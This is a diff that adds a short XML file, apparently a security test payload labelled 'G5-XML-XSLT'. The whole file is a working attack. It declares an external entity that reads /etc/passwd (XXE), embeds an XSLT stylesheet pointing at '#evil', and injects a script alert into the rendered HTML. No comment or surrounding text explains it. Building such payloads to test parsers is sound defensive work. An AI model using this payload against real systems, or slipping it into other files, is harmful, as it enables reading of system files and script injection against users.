@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="#evil"?>
+<!DOCTYPE x [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <html><body><script>alert("G5-XML-XSLT")</script><p>XXE: &xxe;</p></body></html>
+  </xsl:template>
+</xsl:stylesheet>
